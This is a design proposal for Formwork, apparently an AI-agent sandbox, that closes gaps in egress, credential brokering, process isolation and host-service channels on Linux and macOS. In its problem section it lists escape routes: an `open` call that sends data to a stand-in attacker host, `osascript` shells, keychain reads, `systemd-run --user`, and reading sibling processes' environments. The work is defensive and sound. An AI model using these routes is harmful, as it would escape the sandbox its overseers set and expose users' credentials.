# FEP-5 (proposal): closing the sandbox gap with meta-harness sandboxes, on Linux and macOS

**Formwork Enhancement Proposal 5 — proposal, not landed.** Companion to `formwork.md` (design +
end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (host-scoped egress, which this FEP
builds on), and `docs/usability-review.md` / `docs/unstated-requirements.md` (the usability criteria
§9 applies). Motivated by `docs/omnigent-integration-eval.md`.

**Status.** Nothing here changes the landed spec or the constitution yet.
- New identifiers use draft numbering, written as inline code so the requirements canary skips them.
- Draft numbers start above the highest landed or drafted number: `FW-E2E-074` and `FW-ADV-015`
  landed; `FW-INV12` drafted in FEP-4; `FW-EGR6` and `FW-FID5` drafted in FEP-1; `FW-DISC7`–10
  reserved by FEP-4.
- Amendments to landed text are written as blocks to apply on landing (§7).

**Platform stance.** Each gap is closed on both backends, or the report states the difference.
- Every design section has a Linux and a macOS mechanism. §5 compares parity with one column per
  platform.
- Blueprint vocabulary is portable. No field value is a platform-specific name (§1.1). The same
  blueprint means the same thing on both backends ([FW-XR6](../formwork.md#fw-xr6)).
- A macOS claim not yet observed on Seatbelt is marked **(characterize)**. A CI test in the macOS
  characterization suite (§8) settles it before the requirement it supports is anchored.
- Nothing is reported `Enforced` from reasoning alone ([FW-INV5](../formwork.md#fw-inv5)).

---

## 1. Problem

Omnigent's OS sandbox, "OmniBox", has three parts:
- bubblewrap on Linux;
- `sandbox-exec` with `(deny default)` on macOS;
- a mandatory L7 egress proxy.

`docs/omnigent-integration-eval.md` compares it with Formwork. Each system covers much of what the
other lacks.

Formwork leads on the capability model:
- the credential floor under broad grants;
- the exec allowlist;
- tamper-vector write-subtract;
- the create/modify split;
- the FidelityReport, `explain` and `learn`;
- MCP shading.

The gaps, per platform:

| # | Gap | Omnigent Linux | Omnigent macOS | Formwork Linux today | Formwork macOS today |
|---|---|---|---|---|---|
| G1 | Mandatory egress, allowlisted by **host, method and path** | netns + proxy | SBPL allows `localhost:<relay>` only | `Deny` / `Ports` only | `Deny` / `Ports` only |
| G2 | **Credential injection**: the agent never holds the token | Proxy injects `Authorization` | Same | Deny or expose ([FW-CRED5](../formwork.md#fw-cred5)) | Same |
| G3 | **UDP** closed | Closed (netns) | Closed (`deny default`) | Open under `Ports`; the report doesn't say so | Closed (`deny network*`) |
| G4 | **Pathname AF_UNIX** (Docker, ssh-agent, session bus) | Not mounted, so unreachable | Denied except the relay | `connect()` unmediated | Closed except the resolver literal |
| G5 | **Process isolation**: other PIDs, `/proc`, IPC, private `/tmp` | Namespaces | `signal` / `process-info` limited to self; no namespaces | None; shared `/tmp` | None; shared `/tmp` and `$DARWIN_USER_TEMP_DIR` |
| G6 | **Privileged kernel interfaces** (IOKit, `mach-priv*`) | n/a (seccomp) | Not granted | seccomp baseline ([FW-ISO8](../formwork.md#fw-iso8)) | Allowed: `(allow default)` has no baseline |
| G7 | **Host-service channels**: a service outside the sandbox that runs code, opens URLs, or releases secrets for the confined process | Closed (private `$XDG_RUNTIME_DIR`, `DBUS_*` stripped) | AppleEvents/`lsopen` presumed closed **(characterize)**; all `mach-lookup` allowed | Open: session bus, `systemd --user`, X11/Wayland sockets (see G4) | Open: `appleevent-send`, `lsopen`, all `mach-lookup` |
| G8 | **Other processes' arguments and environment** | Hidden (PID ns) | `sysctl` `kern.procargs2` readable **(characterize)** | Open for same-uid processes: a confined process read a sibling's `/proc/<pid>/environ` and `cmdline` (verified; Landlock does not govern `ptrace_may_access`) | `kern.procargs2` returns same-uid **environments** **(characterize)** |

G7 is the largest gap. A confined process that can reach a host service acting on its behalf leaves
the sandbox without breaking anything.

On macOS, `(allow default)` permits:
- `open 'https://attacker.example/?d=…'`: LaunchServices starts the browser outside the sandbox, an
  egress bypass;
- `osascript … do script`: a shell outside the sandbox;
- `pbpaste`: the clipboard;
- `security find-generic-password -w`: keychain items that don't prompt.

On Linux, when a user session is running, an unmediated socket permits:
- `systemd-run --user`: a command outside the sandbox;
- `xdg-open`: the LaunchServices equivalent;
- the Secret Service: the keychain equivalent;
- the X11 or Wayland sockets: clipboard access and input injection.

Container and CI hosts usually run no user session, which is why the Linux evaluation did not see
this: the probe host had nothing to reach, so the gap was found by reading code, not by a denial.
That is a blind spot in the evaluation method, and it would also be a blind spot in CI, whose
runners are headless too. This FEP closes it twice: the test suite brings its own session
(§4.1), and `detect` tells each operator which of these facilities *their* host has (`FW-FID10`),
so the residual is stated concretely on a desktop and stated as absent on a server.

This FEP closes G1–G8 within the closed concept list:
- G1, G3 and G4 use one Linux mechanism, a `connect()` supervisor. It is the on-demand form of fd
  minting ([FW-GW6](../formwork.md#fw-gw6)). On macOS the same three are static SBPL rules.
- G2 extends the Catalog and the Gateway.
- G5 and G8 are an optional Confiner tier plus one default-on deny.
- G6 and G7 extend the anti-shedding baseline to both backends.

**Phasing.** Each phase lands independently, and the report is honest at every phase boundary.
- **Phase 0** — defects (§2). Two block the default profile on Linux; two make the macOS report
  over-claim.
- **Phase 1** — baselines that need no new transport: channels and privileged interfaces (§3.4),
  environment disclosure (§3.3, `FW-ISO16`), and their report lines.
- **Phase 2** — egress transport: the Linux supervisor, the macOS endpoint, UDP and resolver closure
  (§3.1).
- **Phase 3** — inspection and brokering (§3.2), which depend on Phase 2.
- **Phase 4** — the `isolate` tier (§3.3).
- Throughout — `explain`, `learn` and refusal messages (§3.5) land with the phase that introduces
  each denial kind.

### 1.1 Constraints this FEP holds to

- **No new concept.** The supervisor is the Gateway minting fds over the Seam. Brokering is the
  Catalog plus the Gateway. The isolation tier and the channel baseline are Confiner mechanism.
- **Kernel-first transport.** The confined process has no network path around the Gateway
  ([FW-XR7](../formwork.md#fw-xr7)). Proxy env vars help clients find the Gateway; they are never
  the enforcement.
- **Honesty.** Each new capability has a FidelityReport line per backend. A request the host cannot
  provide is refused before the workload starts ([FW-XR9](../formwork.md#fw-xr9)). A `Partial`
  verdict runs, with a report line and one operator-channel line naming the residual.
- **Portable vocabulary.** New blueprint values name *what* is granted — `clipboard`, `os-keyring`,
  `processes` — never *how* one platform implements it: no mach service names or socket paths in a
  blueprint. The compiler maps each value per backend.
- **Transparency ([FW-TRA2](../formwork.md#fw-tra2)).**
  - The macOS base stays `(allow default)`.
  - New default denies ship only after passing the toolchain gate and the agent-example gate
    (`FW-E2E-084`).
  - A deny that fails either gate moves to the `strict` profile, and the default reports it
    `Partial`.
- **Growth.** No new subcommand and no new CLI flag. Two new blueprint fields (`channels`,
  `isolate`) and two extended ones (`net`, `allow-credentials`), each justified in §6. TLS
  termination is opt-in per host.

---

## 2. Phase 0 — defects (bug fixes, no Concepts amendment)

| # | Platform | Defect | Violates | Proposed fix |
|---|---|---|---|---|
| D1 | Linux | `extends = ["builtin:default"]` fails at enforce time with `any-depth pattern **/.git/config cannot be a rooted Landlock rule`. `write-subtract` `**/` rows pass through the compiler unfiltered (`formwork-compile/src/lib.rs:440`); the floor's are withheld (`:432`). The README quickstart does not start on Linux. | [FW-INV5](../formwork.md#fw-inv5), [FW-XR6](../formwork.md#fw-xr6) | Withhold these rows the same way as the floor's. Report the tamper-vector set `Partial` with the reason. Add an E2E test that runs the README quickstart verbatim on both CI OSes; none does today. |
| D2 | Linux | `formwork explain $CWD/sub/.env` answers "denied (credential floor)", but the file is readable | [FW-INV5](../formwork.md#fw-inv5), [FW-FID6](../formwork.md#fw-fid6) | `explain` shows the per-host verdict ("withheld on this host") next to the model verdict |
| D3 | Linux | New files cannot be created in the project root. `protect_policy_inputs` write-denies `FORMWORK.toml` and its derived files, which splits the root. | [FW-TRA1](../formwork.md#fw-tra1) | Accept `.formwork/blueprint.toml` as a discovery location alongside `FORMWORK.toml` ([FW-BP8](../formwork.md#fw-bp8) walk unchanged otherwise). Keep derived files in `.formwork/`, so the protected hole is one directory and the root is not split. The files stay in the project, so learned grants can still be committed and shared. When the root is split, `run` and `explain` say so on Linux and name the `.formwork/` layout. Alternatives are in §8. |
| D4 | Linux | Under `Ports`, UDP is unrestricted, but the report says `net-default-deny enforced` | [FW-INV5](../formwork.md#fw-inv5) | Report `Partial: UDP unrestricted under the port tier` now. Phase 2 enforces it (`FW-ISO11`). |
| D5 | Linux | The CrossDomainSocket `Partial` reason omits that pathname `connect()` is unmediated, including the session bus and `systemd --user` (an escape, G7) | [FW-INV5](../formwork.md#fw-inv5) | Reword the reason and name the escape. The default env scrub strips `DBUS_SESSION_BUS_ADDRESS`, `DISPLAY` and `WAYLAND_DISPLAY`; this makes the sockets harder to find, not unreachable, so the verdict stays `Partial`. Phase 2 enforces (`FW-ISO12`). |
| D6 | both | The Gateway forwards non-JSON frames, JSON-RPC batch arrays, and id-less `tools/call` / `resources/read` / `prompts/get` unfiltered | [FW-GW2](../formwork.md#fw-gw2), [FW-GW4](../formwork.md#fw-gw4) | Non-JSON frame: close the connection. Batch arrays: refuse them (MCP 2025-06-18 removed batching). Gated methods: check policy whether or not they carry an `id`. Test: `FW-ADV-016`. |
| D7 | macOS | No report line for host-service channels or privileged interfaces | [FW-INV5](../formwork.md#fw-inv5), [FW-XR1](../formwork.md#fw-xr1) | Report both `Unenforceable` now. Phase 1 closes them (`FW-ISO13`, `FW-ISO14`). |
| D8 | macOS | The port tier's mDNSResponder literal is a DNS exfiltration channel, and the report doesn't list it | [FW-INV5](../formwork.md#fw-inv5) | Report it under the port tier. Drop the literal under `AllowHosts` (`FW-EGR12`). |
| D10 | both | `extends = ["builtin:default"]` plus `mode = "unveil"` is **not closed**: the profile carries an explicit `reads = ["/**"]`, explicit grants survive the mode flip ([FW-E2E-060](../formwork.md#fw-e2e-060) case 4), so `explain /etc/hostname` answers `granted, rule /**, builtin:default` (verified). An operator who asked for the empty universe gets ambient reads with no warning. | [FW-INV6](../formwork.md#fw-inv6) fail-open-silent, [FW-BP7](../formwork.md#fw-bp7) | The ambient universe is a property of `read-mode`, not a row: remove `reads = ["/**"]` from `builtin:default` (ambient mode already means `/`), and make the compiler refuse a `/**` read row under `closed` with a message naming the layer it came from. Every scenario blueprint in §10 was silently ambient because of this. |
| D11 | Linux | Closed mode grants `/proc/self` to the direct child only (post-fork inode grant, `landlock.rs:305-313`); a grandchild's `/proc/self` resolves to a different directory and is denied (verified: `sh -c 'head /proc/self/status'` → EACCES). `/etc` is not in the closed-mode essentials, so `/etc/hosts`, `/etc/resolv.conf`, `/etc/passwd`, `/etc/ssl` are denied too. Any shell → node/cargo/go chain fails under unveil. | [FW-TRA1](../formwork.md#fw-tra1), [FW-TRA2](../formwork.md#fw-tra2) | Add `/etc` (read) to the Linux closed-mode essentials, matching macOS's `/private/etc`. For `/proc/self`, grant `/proc` read in closed mode and report process-environment disclosure `Partial` (D9) — the honest verdict, since `/proc/**` is what every unveil operator writes by hand today. |
| D9 | Linux | `formwork.md` §9 describes Landlock scoping as blocking processes outside the domain, and this FEP's first draft repeated that `/proc/<pid>/environ` was blocked. A confined process read a same-uid sibling's `environ` and `cmdline` (verified). Scoping covers abstract sockets and signals only. | [FW-INV5](../formwork.md#fw-inv5), honesty is bidirectional (constitution Errors) | Add a report line `process-environment disclosure: Partial (same-uid readable)` on Linux, and correct the §9 prose (§7). Phase 1 adds the macOS deny and Phase 4 the Linux tier (`FW-ISO16`). |

---

## 3. Design

### 3.1 Egress transport (G1, G3, G4)

FEP-1 specifies what host-scoped egress permits. This section specifies how an unmodified HTTP
client reaches the Gateway. Each platform has to guarantee that the Gateway's endpoint is the only
endpoint the confined process can reach.

**Who runs the Gateway.** `formwork run` hosts the Gateway in-process whenever the blueprint's net
posture is `AllowHosts`. The user starts nothing extra. The launcher sets `HTTP(S)_PROXY`,
`NO_PROXY=` (empty) and the CA variables (§3.2). The existing `formwork gateway` subcommand stays
MCP-only.

Under `confine-self` no process sits outside the sandbox to host the Gateway, so `AllowHosts` is
refused before exec ([FW-XR9](../formwork.md#fw-xr9)). The error names the reason and the
alternative: drop `--confine-self` to use the spawn posture.

**Linux: seccomp user notification.**

Under `AllowHosts`, the Confiner installs a filter that returns `SECCOMP_RET_USER_NOTIF` for
`connect()` on AF_INET, AF_INET6 and AF_UNIX sockets. The listener fd goes to the spawning `formwork`
process — the supervisor, part of the Gateway — over the spawn socketpair.

For each notification, the supervisor:
1. copies the `sockaddr` and validates the notification id (`SECCOMP_IOCTL_NOTIF_ID_VALID`);
2. decides, using its copy;
3. if the decision is allow:
   - opens a TCP socket to the Gateway listener;
   - registers the socket's local port as an authenticated seam connection;
   - installs it in the target with `SECCOMP_IOCTL_NOTIF_ADDFD` + `SECCOMP_ADDFD_FLAG_SETFD`, and
     returns 0;
4. otherwise returns `EACCES` and emits a violation record ([FW-FID5](fep-1.md#fw-fid5)).

The kernel never re-reads the target's buffer, and the target never completes a connection, so the
pointer-argument TOCTOU of user notification does not apply.

The same filter:
- denies AF_INET/6 `SOCK_DGRAM` at `socket()`;
- denies `sendto`/`sendmsg` carrying an address on a stream socket (TCP Fast Open);
- delivers `sendto`/`sendmsg` carrying an address on an AF_UNIX datagram socket to the supervisor as
  well. Datagram unix sockets reach a path without `connect()` (`/dev/log` is the common case), so
  mediating `connect()` alone would leave that route open. The supervisor applies the §3.1.1 grant
  check to the address; a granted path is forwarded by the supervisor performing the send through a
  socket it holds, and an ungranted one returns `EACCES`.

For pathname AF_UNIX sockets (G4, G7), the supervisor:
1. resolves `sun_path` against the target's `/proc/<pid>/root` and `cwd`, opening it `O_PATH` on
   its own side;
2. allows the connection only if the socket is granted (§3.1.1) or was bound inside the session;
3. if allowed, connects through `/proc/self/fd/<n>` and injects the result.

The Gateway listener accepts only connections whose source port the supervisor registered. A
co-resident process is refused, which satisfies [FW-EGR6](fep-1.md#fw-egr6) with no proxy token.

Requirements and options:
- Linux 5.9 or later, which is below the Landlock ABI 4 floor (6.7) that the port tier already
  needs.
- An optional netns path: with unprivileged user namespaces and the isolation tier (§3.3), the
  session can instead get an `lo`-only network namespace with an in-namespace relay on the Seam.

**macOS: static SBPL and an authenticated local endpoint.**

- **Profile.** Keep `(deny network*)`, then re-allow exactly
  `(allow network-outbound (remote tcp "localhost:<P>"))` for this session's listener. SBPL remote
  filters accept only `*` or `localhost` as the host **(characterize)**, so the listener must
  authenticate connections itself.
- **Authentication, in two layers:**
  1. A per-session credential in `HTTP(S)_PROXY` (`http://fw:<nonce>@127.0.0.1:<P>`).
  2. A peer-process check. The Gateway maps the loopback 4-tuple to its owning PID
     (`proc_pidfdinfo` / `PROC_PIDFDSOCKETINFO`) and requires that PID to belong to the session. An
     unresolvable peer is refused.

  [FW-EGR6](fep-1.md#fw-egr6) is `Enforced` on macOS only if the peer check characterizes as
  reliable. Otherwise it is `Partial`, and the residual is named: a same-uid process that reads the
  agent's environment.
- **Other routes:**
  - UDP and pathname sockets are closed by `(deny network*)`, apart from granted literals.
  - Under `AllowHosts` the mDNSResponder literal is dropped. HTTP clients using a proxy don't
    resolve names locally, so every lookup happens in the Gateway, which pins it
    ([FW-ADV-008](fep-1.md#fw-adv-008)).
  - Handing a URL or a command to an unconfined process is closed by §3.4.
- **Violations.** Seatbelt denials reach [FW-FID5](fep-1.md#fw-fid5) through the unified-log tap
  after the fact, not synchronously. The report says so.

#### 3.1.1 Granting a unix socket

A session that needs a socket, for example `SSH_AUTH_SOCK` for a `git push` the operator wants,
names its path with the existing `allow` verb. `explain` shows the grant.
- **Linux:** the supervisor admits the socket.
- **macOS:** the compiler emits `(allow network-outbound (literal …))`.

Catalog-located sockets (ssh-agent) stay floor-denied unless excluded
([FW-CRED5](../formwork.md#fw-cred5)).

### 3.2 Inspection and credential brokering (G1 method/path, G2)

FEP-1 declared TLS interception and credential masking non-goals "unless a concrete requirement
demands" them. Two such requirements now exist:
- **Path-scoped writes.** For example, `POST api.github.com/repos/acme/**` and nothing else. CONNECT
  or SNI scoping lets any repo on that host be written.
- **Credential brokering.** This is `formwork.md` §11's open question, which the Catalog is now
  shaped to answer.

**Inspected hosts.** A host rule with `methods`, `paths`, or a brokered credential is inspected. For
such a host the Gateway:
- terminates TLS with a leaf certificate minted for the SNI;
- checks that the SNI, the `Host` header and the CONNECT target agree;
- canonicalizes the request (`FW-EGR11`) and matches it against the rule;
- re-originates the request upstream with the host trust store.

Plain host grants keep FEP-1's CONNECT/SNI grade, which is `Partial` per
[FW-EGR5](fep-1.md#fw-egr5).

Omnigent's matcher does not canonicalize. `/repos/acme/../other/x` matches `/repos/acme/**` there
(verified against `omnigent/inner/egress/rules.py`), and `FW-ADV-017` pins that case.

**CA and client trust.**
- **The CA.** Generated in memory per session; its key never touches disk. The certificate plus the
  host bundle is written read-only into the session scratch.
- **Client configuration.** The launcher points `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`,
  `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO` and `PIP_CERT` at that file.
- **The file is readable in every read mode.** The session scratch is a Launcher-owned path, and
  Launcher-owned paths are implicit read grants under `closed` as under ambient (`FW-TRA9`). All four
  §10 scenarios found the earlier draft silent on this; under unveil an ungranted CA file fails every
  TLS client on its first request and the `FW-FID9` diagnosis would then blame the client.
- **Linux clients.** OpenSSL, BoringSSL, rustls-native-certs, Node, Python and Go honor these
  variables. `uv` does not by default (bundled roots; `UV_NATIVE_TLS=1` opts in), so the `uv`
  recipe in `examples/` sets it.
- **macOS clients.** Security.framework clients ignore them: Go on darwin (so `gh`), Swift
  `URLSession`, and Apple tools. Against an inspected host they fail closed.
  - Installing the CA into the user's keychain search list would change trust host-wide, so that is
    excluded.
  - The per-host verdict reads `Enforced (env-trust clients); platform-verifier clients refused`.

**Diagnosing a refused client.** A client that rejects the session CA fails with an opaque error
such as `x509: certificate signed by unknown authority`. The Gateway observes the `unknown_ca` TLS
alert and emits one operator-channel line naming:
- the host;
- the likely cause: the client does not read `SSL_CERT_FILE`;
- on macOS, the Security.framework note;
- the options: drop inspection for that host, or use a client that honors the variable.

This is `FW-FID9`: a failure caused by Formwork is explained by Formwork, not left to the client's
error text.

**Brokering.**
- **Catalog.** Entries gain an optional `broker` block:
  - `hosts`: where the credential may be presented;
  - `scheme`: `bearer`, `basic` or `header:<name>` (Anthropic's `x-api-key`, which Omnigent's
    `Authorization`-only injector cannot express).
- **Blueprint.** `allow-credentials = ["broker:anthropic"]` (one list; see below).
- **Effect.** The floor is unchanged: the variable is stripped and the file denied. The Gateway
  reads the source at session start, and again at a stated refresh interval.
- **Placeholder.**
  - The launcher sets the variable to `fwcred-<type>-<nonce>` *after* the Catalog strip and the
    [FW-ENV2](../formwork.md#fw-env2) scrub have run, so a `*_KEY`/`*_TOKEN` name shape never
    removes it. `HTTP(S)_PROXY` is set at the same point. Clients that require the variable still
    start.
  - The Gateway substitutes the real credential in the scheme's header, only on requests to bound
    hosts.
  - The placeholder sent anywhere else is refused, with a violation record.
- **Compile-time check.** A brokered type makes its bound hosts inspected. A brokered type whose
  hosts are absent from the allowlist fails at compile, with a message that names the missing hosts
  (`FW-CRED12`).
- **macOS caveat.** When the typical client for a brokered type verifies through Security.framework,
  `explain` and the operator channel say so before the run (`github` / `gh`). The pre-run notice is
  the XR9-shaped part: the operator learns before the run, not from a TLS failure halfway through a
  session.
- **Out of scope.** Signing schemes (AWS SigV4, GCP JWT minting) and SSH agent brokering (§8).

**One list for credentials (revised after §10).** An earlier draft added `broker-credentials` beside
`allow-credentials`: two typed lists over the same Catalog with opposite meanings and a parse error
at their intersection. Three of four simulated operators asked for one list. Brokering is now a
*grade* on the existing `allow-credentials` entry, spelled with the verb-prefix idiom `rules`
already uses:

```toml
allow-credentials = ["claude", "broker:anthropic", "broker:github"]
```

- A bare type exposes the credential to the agent (landed meaning, unchanged).
- `broker:<type>` keeps the floor and brokers the credential through the Gateway.
- The same type in both forms resolves to `broker` (the narrower grade), with an operator-channel
  line; no parse error.
- **Per-host scheme.** The Catalog `broker` block is a list of `{ hosts, scheme }` pairs, because one
  type needs different schemes on different hosts: `github` is `basic` (user `x-access-token`) on
  `github.com` for `git push` and `bearer` on `api.github.com` for the API. One scheme per type
  cannot serve a PR workflow.
- **Swap-on-access.** When a request to a bound host carries no credential header, the Gateway adds
  it. This is what makes `git push` work without a credential helper: git sends no `Authorization`
  on its own, and nothing in the sandbox holds a placeholder to present. The placeholder path stays
  for clients that require the variable to start.
- **Embedder bindings.** An entry may also be a table for a credential the Catalog does not know:
  `{ name = "ghe", env = "GHE_TOKEN", hosts = ["ghe.corp.internal"], scheme = "bearer" }`. The
  Launcher strips `env`, the Gateway brokers it. Omnigent's `credential_proxy` entries are
  user-defined, and without this the embedder mapping is impossible (§10 scenario 3).
- **OAuth clients.** Claude Code prefers an API key over its OAuth login when `ANTHROPIC_API_KEY` is
  set, so a brokered placeholder switches its auth mode. The Claude Code example brokers `anthropic`
  only in its API-key variant; the OAuth variant lifts `claude` and brokers nothing.

**The minimal blueprint stays short.** The README-layer shape of this feature:

```toml
extends = ["builtin:default"]
rules = ["readwrite:$CWD/**"]
net = { hosts = ["api.anthropic.com"] }             # egress to this host only, via the gateway
allow-credentials = ["broker:anthropic"]           # the agent sees a placeholder, never the key
```

### 3.3 Process isolation (G5, G8)

**Default-on for both backends (`FW-ISO16`): other processes' environments are unreadable where the
platform can express it, and reported where it cannot.** Environment disclosure is a
credential-disclosure path, so this is not part of the opt-in tier.
- **macOS:** the default profile denies `sysctl-read` of `kern.procargs2` **(characterize)**. On
  macOS this call returns the full environment of same-uid processes.
- **Linux:** a confined process can read a same-uid sibling's `/proc/<pid>/environ` and `cmdline`
  today (verified on this host under `ambient-minus-subtract`). Access to those files is decided by
  `ptrace_may_access`, which Landlock does not govern, and a Landlock deny on `/proc/<pid>` cannot be
  written for "every pid but the caller's": a rule is bound to one inode at spawn, while each
  descendant's `/proc/self` resolves to a different directory. The honest verdicts are:
  - `Partial` in the default profile, with the residual named ("same-uid process environments are
    readable");
  - `Enforced` under `isolate = ["processes"]`, where the fresh `procfs` in the PID namespace lists
    only session processes;
  - `Enforced` when stacked under an outer PID namespace (Omnigent's bwrap). `detect` reads
    `NSpid` in `/proc/self/status`; more than one field means a nested PID namespace, and the
    HostProfile carries it so the report does not print a false `Partial` under bwrap.

  The report line and one operator-channel line state this on every Linux run without the tier.

**Default-on for both backends: a private temporary directory (`FW-TRA9`).** Revised after §10: an
earlier draft made this an `isolate` member, and two of four scenarios wanted it without wanting PID
isolation. It is free on both platforms in the directory form, so it is no longer a field. The
Launcher creates a per-session directory, points `TMPDIR`/`TMP`/`TEMP` at it, and grants it
read-write in every read mode. `builtin:default` keeps its `/tmp/**` write grant, so tools that
hardcode `/tmp` keep working (transparency); they share, and the report says
`private tmp: Partial (directory form; /tmp shared by profile grant)`. A blueprint that drops the
`/tmp/**` grant gets `Enforced`. Under `isolate = ["processes"]` on Linux the directory becomes a
tmpfs in the mount namespace.

**Opt-in tier: `isolate`.** It is opt-in because it changes what `ps`, debuggers and IDE bridges
see. It has two portable members.

| Member | Linux | macOS |
|---|---|---|
| `processes`: other processes are not visible, signalable or inspectable, including their arguments | user + PID namespaces with a fresh `/proc` (plus UTS); a minimal Formwork init as PID 1. `Enforced` where user namespaces exist | `(deny process-info* (target others))`, `(deny signal (target others))` with session re-allows **(characterize)**, and `sysctl-read` denies on the process-enumeration MIBs. `Enforced` or `Partial` per characterization |
| `ipc`: SysV/POSIX IPC confined to the session | IPC namespace. `Enforced` where user namespaces exist | `ipc-sysv-*` denied; POSIX names restricted to a session prefix **(characterize)**. `Partial` (POSIX names are global) |

**Namespace setup order (Linux).** User, PID, IPC, UTS and mount namespaces are created before
Landlock and seccomp are installed. After that, the seccomp baseline still denies `CLONE_NEWUSER`
and the mount family ([FW-ISO8](../formwork.md#fw-iso8)).

**macOS temp locations.** `$DARWIN_USER_TEMP_DIR` (`confstr(_CS_DARWIN_USER_TEMP_DIR)`, under
`/private/var/folders`) is where `os.tmpdir()` lands when `TMPDIR` is unset and where Apple tools
look regardless. The private directory is created beneath it, so `confstr` callers still resolve
inside the session. The per-session directory is named in `explain` output and on the operator
channel ([FW-FID7](../formwork.md#fw-fid7)).

**Verdicts.**
- A member the host cannot provide at all — `processes` or `ipc` on Linux without user namespaces —
  is refused before spawn ([FW-XR9](../formwork.md#fw-xr9)). The refusal names the reason and every
  alternative the host offers: on an AppArmor-restricted Ubuntu 24.04 that is the one-line
  `sysctl kernel.apparmor_restrict_unprivileged_userns=0` an administrator or CI runner can apply,
  running under bwrap (which Ubuntu ships an AppArmor profile for), or dropping the member.
- A CI matrix that spans kernels should not request `processes` in a shared blueprint; the §10 CI
  scenario shows the same file working on 22.04 and refused on 24.04. A best-effort spelling was
  considered and rejected: "isolate if you can" is a verdict the blueprint cannot request
  ([FW-INV6](../formwork.md#fw-inv6)); the report line under `Partial` is the honest form of it.
- A member the host provides only `Partial` runs, and prints one operator-channel line naming the
  residual.

**Stacked under Omnigent's bwrap** (evaluation Option B), the outer layer provides this, and the
blueprint leaves `isolate` unset.

### 3.4 Host-service channels and privileged interfaces (G6, G7)

The anti-shedding baseline ([FW-ISO8](../formwork.md#fw-iso8)) extends to both backends and to
services that act on the process's behalf. It is on in every blueprint.

A channel is lifted in one of two ways:
- by name, in a new `channels` field whose values are a closed, portable enum;
- through the Catalog's typed exclusion, when the channel is a credential store.

| Portable name | Lifted by | macOS mechanism (SBPL deny) | Linux mechanism |
|---|---|---|---|
| `run-outside` | `channels` | `appleevent-send`; `mach-lookup` of launchd job submission and the AppleEvent server **(characterize: names)** | supervisor denies the session-bus and `systemd --user` sockets; `DBUS_*` stripped |
| `open-url` | `channels` — **brokered, never a host-service lift** (below) | the Gateway opens the URL on the host; `lsopen` and `launchservicesd` stay denied | the Gateway opens the URL on the host; the session bus stays denied |
| `clipboard` | `channels` | `mach-lookup` `com.apple.pasteboard.*` | X11/Wayland sockets; abstract X11 is already scoped by Landlock ABI 6 |
| `screen` | `channels` | `mach-lookup` of WindowServer/screencapture services **(characterize)** | X11/Wayland sockets |
| `camera`, `microphone` | `channels` | `iokit-open` of those classes; `mach-lookup` `com.apple.cmio.*` / `com.apple.audio.*` | `/dev/video*`, `/dev/snd/*` denied by default subtract |
| `os-keyring` | `allow-credentials` (a Catalog type) | `mach-lookup` of `securityd` / `SecurityServer` **(characterize)** | session bus `org.freedesktop.secrets` — **coupled with `run-outside`**, see below; `$XDG_RUNTIME_DIR/keyring/*` |
| (none) | — | `mach-priv-host-port`, `mach-priv-task-port`; `iokit-open` outside the shipped allowlist | seccomp (unchanged) |

**`open-url` is brokered, not lifted (revised after §10).** An earlier draft lifted LaunchServices on
macOS and the portal on Linux. The team scenario found that on Linux the portal, `systemd --user`
and the Secret Service are all one socket, `$XDG_RUNTIME_DIR/bus`; a `connect()` supervisor sees one
`sun_path` and cannot tell `OpenURI` from `StartTransientUnit`. Lifting `open-url` there would have
lifted `run-outside`. The fix is the single-privileged-broker pattern the constitution already has:
- The Launcher places a `formwork`-owned `xdg-open` / `open` shim first in `PATH` (and sets
  `BROWSER` to it). The shim sends the URL over the Seam to the Gateway.
- The Gateway accepts `http(s)` URLs only, refuses `file:`, `javascript:` and custom schemes, logs
  the URL on the operator channel, and opens it with the host's opener, outside the sandbox.
- No host service is lifted on either platform. The channel is `Enforced` on both, closed mode needs
  no grant, and `learn` proposes it from the shim's refusal record, not from a socket denial.
- What the agent gains is exactly "open this web page in the user's browser", which is the login
  use case; a URL is data the user sees in the address bar, not a command.

**The Linux session bus couples `os-keyring` with `run-outside`.** Lifting the Secret Service on a
Linux desktop lifts the bus, and the bus also carries `systemd --user`. The report says so:
`os-keyring: Partial (Linux: shares the session bus with run-outside)`, and `explain os-keyring`
prints the same. A D-Bus filtering proxy would separate them; it is a new component and stays an
open question (§8.2). On macOS `securityd` has its own mach service, so the coupling does not exist.

**A lifted channel re-admits the variables its clients need.** D5 strips `DBUS_SESSION_BUS_ADDRESS`,
`DISPLAY` and `WAYLAND_DISPLAY` by default. Lifting `clipboard` (or `screen`) on Linux re-admits
`DISPLAY` and `WAYLAND_DISPLAY`; lifting `run-outside` or `os-keyring` re-admits
`DBUS_SESSION_BUS_ADDRESS`. The compiler derives this from the channel table; the operator writes
nothing. Without it a lifted channel whose client cannot find its socket is a silent no-op, which the
team scenario hit on the first paste.

**Groups: turning a desktop's worth of channels on or off in one word.** An operator on a laptop
does not think in six channels. The `channels` field therefore takes the same shape as the MCP
policy tables ([FW-GW9](../formwork.md#fw-gw9)): an `allow` scope and a terminal `deny` list, whose
entries are channel names or **group** names.

```toml
channels = "deny"                                      # the default: every channel closed
channels = ["clipboard"]                               # sugar for { allow = ["clipboard"] }
channels = { allow = ["desktop"] }                     # the group: what an interactive login needs
channels = { allow = ["desktop"], deny = ["screen"] }  # deny is terminal, from any layer
```

Groups are exact enumerations fixed in the schema, expanded at the parse edge like a sigil
([FW-BP5](../formwork.md#fw-bp5)), never a pattern:
- **`desktop`** = `clipboard`, `open-url`. The two channels an interactive session uses by hand:
  paste into the agent, let it open a login page. Neither runs code outside the sandbox, and
  `open-url` is brokered, so on Linux the group never touches the session bus. Terminal text paste
  is done by the terminal, outside the sandbox; only programmatic clipboard access (`pbpaste`,
  `wl-paste`, image paste) needs the channel, and the `explain clipboard` text says so, so operators
  do not over-grant.
- **`media`** = `screen`, `camera`, `microphone`. The TCC-tier privacy set, grouped so an operator
  who wants screenshots for a UI-testing agent can say so once and see one report line for it.
- **`run-outside`** belongs to no group. It is code execution outside the sandbox and is only ever
  lifted by its own name.
- `os-keyring` stays under `allow-credentials` because it is a credential. A blueprint that wants
  "everything a desktop login needs" writes `channels = { allow = ["desktop"] }` plus
  `allow-credentials = ["claude"]` (or `os-keyring`), and `explain desktop` prints both lines.

Layering follows the fs model: `allow` unions across layers, `deny` is terminal from any layer
